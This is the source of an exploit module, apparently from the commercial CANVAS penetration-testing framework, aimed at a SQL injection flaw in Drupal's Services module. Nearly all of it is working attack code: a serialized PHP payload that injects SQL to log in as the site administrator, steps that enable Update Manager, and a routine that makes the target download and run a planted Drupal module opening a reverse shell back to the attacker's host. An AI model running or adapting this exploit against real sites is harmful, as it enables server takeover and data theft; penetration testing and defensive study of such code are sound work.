#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2006
# http://www.immunityinc.com/CANVAS/ for more information

import sys
import re
import json
import tarfile
import thread

# covers both angles
if "." not in sys.path: sys.path.append(".")

from ExploitTypes.php_multi import *

import logging

NAME                           = 'drupal_services_sqli'
DESCRIPTION                    = ("This exploit leverages a vulnerability in the Drupal module Services that allows " +
                                  "an attacker to send specially crafted requests resulting in arbitrary SQL " +
                                  "injection. It will create a new Drupal Module on the remote server "
                                  "with MOSDEF code on it.")
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'drupal.org'
DOCUMENTATION['Repeatability'] = 'Infinite'

VERSION                        = '0.1'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Web Exploits'
PROPERTY['SITE']               = 'Remote'
PROPERTY['ARCH']               = [["Linux" ] , ["Windows"]]
PROPERTY['VERSION']            = ["Services 7.x-3.x versions prior to 7.x-3.19"]
DOCUMENTATION["References"]    = ["https://www.drupal.org/node/2858847",
                                  "https://github.com/kylebrowning/services",
                                  "https://www.drupal.org/project/services",
                                  "https://www.ambionics.io/blog/drupal-services-module-rce"]
DOCUMENTATION['Notes']         = """

IMPORTANT!
The name of the endpoint and its endpoint_path will be required in order to trigger the attack.
They don't have default values, but most used are 'services' or 'rest'.

NOTES
This module was created based on the vulnerability found by Ambionics: https://www.ambionics.io/blog/drupal-services-module-rce

ROLLBACK
To uninstall the Drupal Module:
- Into the Drupal Database: --> delete from system where name like 'mosdef_module';
- Into the Drupal Server, delete directory: <drupal_dir>/sites/all/modules/tmp
- Into the Drupal Server, clean the CACHE with the following sql query:
        TRUNCATE TABLE cache;
        TRUNCATE TABLE cache_block;
        TRUNCATE TABLE cache_bootstrap;
        TRUNCATE TABLE cache_field;
        TRUNCATE TABLE cache_filter;
        TRUNCATE TABLE cache_form;
        TRUNCATE TABLE cache_image;
        TRUNCATE TABLE cache_menu;
        TRUNCATE TABLE cache_page;
        TRUNCATE TABLE cache_path;
        TRUNCATE TABLE cache_token;
        TRUNCATE TABLE cache_update;
        NOTE: This action of truncating the CACHE will also affect your other installed Drupal Modules!

"""

CHANGELOG                      = """
"""

SUCCESS = 1
FAILURE = 0

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.host               = ""
        self.port               = 80

        self.badstring          = "\x00"
        self.name               = NAME
        self.vhost              = ""

        self.basepath           = "/"
        self.username           = None
        self.password           = None
        self.ssl                = False
        self.protocol           = None
        self.only_test          = False

        self.endpoint           = "rest"
        self.endpointpath       = "?q=rest"
        self.basicauth_user     = None

        self.webserver          = None
        self.webserver_port     = 9000

    def neededListenerTypes(self):
        return [canvasengine.PHPMULTI]

    def getargs(self):
        """
        Get arguments for attack.
        """
        self.getarg("host")
        self.getarg("port")
        self.getarg("ssl")
        self.hostname = self.getarg("host")
        self.getarg("endpoint")
        self.getarg("endpointpath")
        self.getarg("webserver_port")
        self.basepaths = [self.basepath]
        self.getarg("ssl")
        self.getarg("only_test")

    def get_php_to_mosdef(self):
        """
        Creates a string which when included in php's eval() will execute MOSDEF and connect to the Callback Address
        """
        localhost = self.callback.ip
        localport = self.callback.port

        logging.info("Using PHPMULTI callback for %s:%d" % (localhost, localport))
        from phplistener import get_php_stage1 # Gets our "Shellcode"

        badchars = self.badstring
        ret = get_php_stage1(badchars,localhost,localport)
        logging.info("Generated callback shell")
        return ret

    def test(self):
        """
        Try to identify if:
         - The Drupal server is available
         - Parameters for endpoint and endpoint_path are correct
         - The drupal module SERVICES is active
         - The resource user/login is being served by the Services module
         - Content type: application/vnd.php.serialized is allowed
        """
        self.getargs()

        # Ignoring target.interface value 127.0.0.1, unless it has a different value
        if self.target.interface != '127.0.0.1':
            self.host = self.target.interface
        else:
            self.target.interface = self.host

        if self.ssl and self.ssl!="False":
            self.protocol = "https"
        else:
            self.protocol = "http"

        extra_headers = [("Keep-Alive", "115"), ("Content-Type","application/vnd.php.serialized")]

        request = self.endpointpath + "/user/login"
        u = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request
        data = 'a:2:{s:8:"username";s:1:"a";s:8:"password";s:1:"b";}'

        try:
            (res, response_code) = spkproxy.urlopen(u, data=data, extraheaders=extra_headers, exploit=self,
                                                   entireresponse=True, return_response_code=True, verb="POST")
            response = res.read()
            if response_code == 401 and "Wrong username or password" in response:
                return SUCCESS
        except Exception:
            logging.info("The module Services is probably not serving the resource user/login, or the endpoint_path "
                     "and/or endpoint names are not correct.")
            return FAILURE

        return FAILURE

    def get_serialized_payload_sqi_admin(self):
        """
        Return a PHP serialized string that has the SQL injection to get logged in as the user with the first uid
        which will probably be the uid=1, the Drupal Admin
        """
        payload = u"""a:2:{s:8:"username";O:19:"SelectQueryExtender":4:{s:8:"\0*\0query";O:17:"DatabaseCondition":5:{s:13:"\0*\0conditions";a:1:{s:12:"#conjunction";s:3:"AND";}s:12:"\0*\0arguments";a:0:{}s:10:"\0*\0changed";b:0;s:29:"\0*\0queryPlaceholderIdentifier";N;s:13:"stringVersion";s:186:"0x3a) union all select 1,'a','$S$D3k1DDzZXglSE8nKHrnQIHK/wwrAKhjQQ9e65Yl1T0mwlJAvKjfp' as pass,'b','c','d','e','f','g','h','i','j','k','l','ll','m' from {users} users where users.uid<>(0";}s:19:"\0*\0uniqueIdentifier";s:8:"immunity";s:13:"\0*\0connection";N;s:14:"\0*\0placeholder";i:0;}s:8:"password";s:7:"llavero";}"""
        return payload

    def login(self):
        """
        Login to the Drupal server using a SQI to get Admin credentials
        :return:
         Session information got from login if successful
        """

        logging.info("Trying to Login to the drupal server")

        extra_headers = [("Keep-Alive", "115"), ("Content-Type", "application/vnd.php.serialized"),
                     ("Accept", "application/json")]
        request = self.endpointpath + "/user/login"
        u = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request
        data = self.get_serialized_payload_sqi_admin()

        try:
            (res, response_code) = spkproxy.urlopen(u, data=data, extraheaders=extra_headers, exploit=self,
                                                   entireresponse=False, return_response_code=True, verb="POST")
            response = res.read()
            if response_code == 200:
                log_line = "Session information obtained: {}".format(response.replace('\n',' | ').replace('\r',' | '))
                logging.info(log_line)

        except Exception:
            return FAILURE

        return json.loads(response)

    def get_field_value_from_html(self, field_name, html):
        try:
            regex_str = '.*name="' + field_name + '" value="(.*?)".*'
            search_str = re.compile(regex_str, re.DOTALL)
            info = search_str.match(html).groups()[0]
        except Exception:
            logging.info('The field {} was not found in the HTML string analyzed'.format(field_name))
            return ""

        return info

    def setup_webserver(t, self, targz_filename):
        """
        Creates a webserver that always returns our drupal module mosdef_module.tar.gz
        """
        serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serversocket.bind(("0.0.0.0", self.webserver_port))
        serversocket.listen(5)

        sent_once = False

        while not sent_once:
            serversocket.settimeout(600.0)
            (client_socket, client_address) = serversocket.accept()
            serversocket.settimeout(600.0)
            #received_request = client_socket.recv(2048)
            file_size = os.path.getsize(targz_filename)
            response = "HTTP/1.1 200 OK\r\nContent-Type: Application/octet-stream\r\nContent-Length: {}\r\n\r\n".format(file_size)
            response +=  open(targz_filename, 'rb').read()
            sent_once = client_socket.send( response )

        return SUCCESS

    @staticmethod
    def prepare_install_module_post(random_boundary, drupal_module_uri, form_build_id, form_token):
        ret = '------WebKitFormBoundaryRANDOM_BOUNDARY\r\nContent-Disposition: form-data; name="project_url"\r\n\r\n' \
              'DRUPAL_MODULE_URI\r\n------WebKitFormBoundaryRANDOM_BOUNDARY\r\n' \
              'Content-Disposition: form-data; name="files[project_upload]"; filename=""\r\n' \
              'Content-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundaryRANDOM_BOUNDARY\r\n' \
              'Content-Disposition: form-data; name="form_build_id"\r\n\r\n' \
              'FORM_BUILD_ID\r\n------WebKitFormBoundaryRANDOM_BOUNDARY\r\n' \
              'Content-Disposition: form-data; name="form_token"\r\n\r\nFORM_TOKEN\r\n' \
              '------WebKitFormBoundaryRANDOM_BOUNDARY\r\nContent-Disposition: form-data; name="form_id"\r\n\r\n' \
              'update_manager_install_form\r\n------WebKitFormBoundaryRANDOM_BOUNDARY\r\n' \
              'Content-Disposition: form-data; name="op"\r\n\r\nInstall\r\n------WebKitFormBoundaryRANDOM_BOUNDARY--' \
              '\r\n'.replace("RANDOM_BOUNDARY",random_boundary).replace("DRUPAL_MODULE_URI", drupal_module_uri).\
            replace("FORM_BUILD_ID", form_build_id).replace("FORM_TOKEN", form_token)
        return ret

    def run(self):
        self.getargs()

        # Ignoring target.interface value = 127.0.0.1, unless it has a different value
        if self.target.interface != '127.0.0.1':
            self.host = self.target.interface
        else:
            self.target.interface = self.host

        self.setInfo("%s attacking %s (in progress)" % (NAME, self.host))
        logging.info("%s attacking %s (in progress)" % (NAME, self.host))

        logging.info('Port: %s' % self.port)
        logging.info('SSL: %s' % self.ssl)
        logging.info('Basepath: %s' % self.basepath)
        logging.info('Endpoint Name: %s' % self.endpoint)
        logging.info('Endpoint Path: %s' % self.endpointpath)

        if self.ssl:
            self.protocol = "https"
        else:
            self.protocol = "http"

        if self.only_test:
            if self.test() == FAILURE:
                logging.info("Target host appears vulnerable")
                return FAILURE
            else:
                logging.info("Target host does not appear to be vulnerable")
                return SUCCESS

        session_information = self.login()
        if session_information == SUCCESS:
            logging.info("There was an error trying to login")
            return FAILURE
        else:
            try:
                resp_user = session_information.get("user")
                logging.info("We got credentials for the drupal user with lower uid")
            except Exception:
                logging.info("There was a problem trying to Login - {}".format(session_information))
                return FAILURE

        try:
            # Cookie: session_name:sessid
            resp_sessid = session_information.get("sessid")
            resp_session_name = session_information.get("session_name")
            session_cookie = "{}={}".format(resp_session_name, resp_sessid)
        except Exception:
            logging.info("There was a problem parsing the Session Information to create the COOKIE")
            return FAILURE

        # Get all ENABLED modules, and if "Update Manager" module is not enabled, then we'll enable it
        logging.info("Getting information about ENABLED modules in the Drupal server")

        request = "?q=admin/modules&"
        u = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request
        extra_headers = [("Cookie", session_cookie), ("Keep-Alive", "115"),
                         ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")]
        try:
            (res, response_code) = spkproxy.urlopen(u, extraheaders=extra_headers, exploit=self,
                                                    entireresponse=True, return_response_code=True, verb="GET")
            response = res.read()
            logging.debug("ResponseCode: {}\n{}".format(response_code, response))

            # Validating if UPDATE MANAGER is active
            if response.find('<input type="checkbox" id="edit-modules-core-update-enable" name="modules[Core][update][enable]" value="1" checked="checked" class="form-checkbox" />') >= 0:
                logging.info("The module UPDATE MANAGER is enabled.")
            else:
                logging.info("The module UPDATE MANAGER is NOT enabled.")
                enabled_modules = []
                res_split = response.split('<input type="checkbox"')
                for checkbox in res_split[1:]:
                    if checkbox.split('/>')[0].find('checked="checked"') >= 0:
                        name_module = re.match('.*name="(.*?)" .*', checkbox).groups()[0]
                        enabled_modules.append(name_module + '=1')

                logging.info("Enabling module UPDATE MANAGER")

                enabled_modules.append('modules[Core][update][enable]=1')

                request = "?q=admin/modules/list/confirm"
                u = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request
                extra_headers = [("Cookie", session_cookie), ("Keep-Alive", "115"),
                                 ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"),
                                 ("Content-Type", "application/x-www-form-urlencoded")]

                form_build_id = 'form_build_id=' + str(self.get_field_value_from_html('form_build_id', response))
                enabled_modules.append(form_build_id)
                form_token = 'form_token=' + str(self.get_field_value_from_html('form_token', response))
                enabled_modules.append(form_token)
                form_id = 'form_id=' + str(self.get_field_value_from_html('form_id', response))
                enabled_modules.append(form_id)
                enabled_modules.append('op=Save+configuration')
                data = '&'.join(enabled_modules)

                (res, response_code) = spkproxy.urlopen(u, data=data, extraheaders=extra_headers, exploit=self,
                                                        entireresponse=True, return_response_code=True, verb="POST")
                response = res.read()
                logging.debug("ResponseCode: {}\n{}".format(response_code, response))

        except Exception:
            return FAILURE

        # Preparing the MOSDEF Drupal module
        with open("/tmp/mosdef_module.info", "w") as file_info:
            file_info.write('core = "7.x"\n')
            file_info.write('description = "MOSDEF module to get a reverse shell. Created on {} {}"\n'.format(time.strftime("%Y/%m/%d"), time.strftime("%H:%M:%S")))
            file_info.write('name = "MOSDEF Drupal module"\n')

            with open("/tmp/mosdef_module.module", "w") as file_module:
                mosdef_php_code = self.get_php_to_mosdef()
                file_module.write('<?php\n\n')
                file_module.write(mosdef_php_code)
                file_module.write('?>')

        mosdef_tar_gz_filename = '/tmp/mosdef_module.{}.tar.gz'.format(time.strftime("%Y%m%d%H%M%S"))
        tarModule = tarfile.open(mosdef_tar_gz_filename, 'w:gz')
        tarModule.add("/tmp/mosdef_module.info")
        tarModule.add("/tmp/mosdef_module.module")

        tarModule.close()

        # Installing mosdef_module through the Drupal admin interface
        logging.info("Installing mosdef drupal module")
        extra_headers = [("Cookie", session_cookie), ("Keep-Alive", "115")]
        request = '?q=admin/modules/install'
        u = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request

        try:
            (res, response_code) = spkproxy.urlopen(u, extraheaders=extra_headers, exploit=self,
                                                    entireresponse=True, return_response_code=True, verb="GET")
            response = res.read()
            logging.debug("ResponseCode: {}\n{}".format(response_code, response))
        except Exception:
            return FAILURE

        # Create the POST DATA to request the drupal server to go and get the mosdef_module.tar.gz in our webserver
        boundary = ''.join(random.choice(string.digits + string.letters) for _ in xrange(16))
        drupal_module_uri = 'http://' + self.callback.ip + ':' + str(self.webserver_port) + '/' + mosdef_tar_gz_filename.split('/')[2]

        try:
            form_build_id = str(self.get_field_value_from_html('form_build_id', response))
            form_token = str(self.get_field_value_from_html('form_token', response))
        except Exception:
            logging.info('There was an error getting the form_build_id and/or the form_token values '
                     'from the module admin page')
            return FAILURE

        data = self.prepare_install_module_post(boundary, drupal_module_uri, form_build_id, form_token)

        content_type = 'multipart/form-data; boundary=----WebKitFormBoundary' + boundary
        request = '?q=admin/modules/install'
        u = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request
        extra_headers = [('Cookie', session_cookie), ('Keep-Alive', '115'), ('Content-Type', content_type),
                         ('Referer', u),
                         ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')]

        # Serving the MOSDEF_Module.tar.gz file locally
        thread.start_new_thread(self.setup_webserver, (self, mosdef_tar_gz_filename,))

        logging.info("Telling the drupal to get the mosdef_module from {}".format(drupal_module_uri))
        try:
            (res, response_code) = spkproxy.urlopen(u, extraheaders=extra_headers, data=data, exploit=self,
                                                    entireresponse=True, return_response_code=True, verb="POST")
            response = res.read()
            logging.debug("ResponseCode: {}\n{}".format(response_code, response))

            if response_code == 302:
                for item in response.split('\r\n'):
                    if item.find('Location:') >= 0:
                        redirection_uri = item.split(' ')[1]
                        (res, response_code) = spkproxy.urlopen(redirection_uri, extraheaders=extra_headers,
                                                                exploit=self, entireresponse=True,
                                                                return_response_code=True, verb="GET")
                        response = res.read()
                        logging.debug("ResponseCode: {}\n{}".format(response_code, response))

                        (res, response_code) = spkproxy.urlopen(redirection_uri.replace("start", "do"),
                                                                extraheaders=extra_headers, data="",
                                                                exploit=self, entireresponse=True,
                                                                return_response_code=True, verb="POST")
                        response = res.read()
                        logging.debug("ResponseCode: {}\n{}".format(response_code, response))

                        (res, response_code) = spkproxy.urlopen(redirection_uri.replace("start", "finished"),
                                                                extraheaders=extra_headers,
                                                                exploit=self, entireresponse=True,
                                                                return_response_code=True, verb="GET")
                        response = res.read()
                        logging.debug("ResponseCode: {}\n{}".format(response_code, response))

                        request = 'authorize.php'
                        authorize_uri = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request

                        (res, response_code) = spkproxy.urlopen(authorize_uri,
                                                                extraheaders=extra_headers,
                                                                exploit=self, entireresponse=True,
                                                                return_response_code=True, verb="GET")
                        response = res.read()
                        logging.debug("ResponseCode: {}\n{}".format(response_code, response))

                        break

        except Exception:
            return FAILURE

        # Get all ENABLED modules, and if "MOSDEF" module is not enabled, then we'll enable it
        logging.info("Getting information about ENABLED modules in the Drupal server")

        request = "?q=admin/modules&"
        u = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request
        extra_headers = [("Cookie", session_cookie), ("Keep-Alive", "115"),
                         ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")]
        try:
            (res, response_code) = spkproxy.urlopen(u, extraheaders=extra_headers, exploit=self,
                                                    entireresponse=True, return_response_code=True, verb="GET")
            response = res.read()
            logging.debug("ResponseCode: {}\n{}".format(response_code, response))

            # Validating if UPDATE MANAGER is active
            if response.find('<input type="checkbox" id="edit-modules-core-update-enable" name="modules[Other][mosdef_module][enable]" value="1" checked="checked" class="form-checkbox" />') >= 0:
                logging.info("The module MOSDEF is enabled.")
            else:
                logging.info("The module MOSDEF is NOT enabled.")
                enabled_modules = []
                res_split = response.split('<input type="checkbox"')
                for checkbox in res_split[1:]:
                    if checkbox.split('/>')[0].find('checked="checked"') >= 0:
                        name_module = re.match('.*name="(.*?)" .*', checkbox).groups()[0]
                        enabled_modules.append(name_module + '=1')

                logging.info("Enabling module MOSDEF")

                enabled_modules.append('modules[Other][mosdef_module][enable]=1')

                request = "?q=admin/modules/list/confirm"
                u = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request
                extra_headers = [("Cookie", session_cookie), ("Keep-Alive", "115"),
                                 ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"),
                                 ("Content-Type", "application/x-www-form-urlencoded")]

                form_build_id = 'form_build_id=' + str(self.get_field_value_from_html('form_build_id', response))
                enabled_modules.append(form_build_id)
                form_token = 'form_token=' + str(self.get_field_value_from_html('form_token', response))
                enabled_modules.append(form_token)
                form_id = 'form_id=' + str(self.get_field_value_from_html('form_id', response))
                enabled_modules.append(form_id)
                enabled_modules.append('op=Save+configuration')
                enabled_modules = enabled_modules
                data = '&'.join(enabled_modules)
                data = data.replace(' - ', '+-+')

                (res, response_code) = spkproxy.urlopen(u, data=data, extraheaders=extra_headers, exploit=self,
                                                        entireresponse=True, return_response_code=True, verb="POST")
                response = res.read()
                logging.debug("ResponseCode: {}\n{}".format(response_code, response))

                if response_code == 302:
                    for item in response.split('\r\n'):
                        if item.find('Location:') >= 0:
                            redirection_uri = item.split(' ')[1]
                            (res, response_code) = spkproxy.urlopen(redirection_uri, extraheaders=extra_headers,
                                                                    exploit=self, entireresponse=True,
                                                                    return_response_code=True, verb="GET")
                            response = res.read()
                            logging.debug("ResponseCode: {}\n{}".format(response_code, response))
                            break

        except Exception:
            return FAILURE

        # Getting the page which contains the MOSDEF
        logging.info("Invoking MOSDEF in the Drupal server")
        extra_headers = [("Cookie", session_cookie),("Keep-Alive", "115")]
        request = "update.php?op=info&continue=1"
        u = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request

        try:
            (res, response_code) = spkproxy.urlopen(u, extraheaders=extra_headers, exploit=self,
                                                    entireresponse=True, return_response_code=True, verb="GET")
            response = res.read()
            logging.debug("ResponseCode: {}\n{}".format(response_code, response))

        except Exception:
            return FAILURE

        return SUCCESS


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
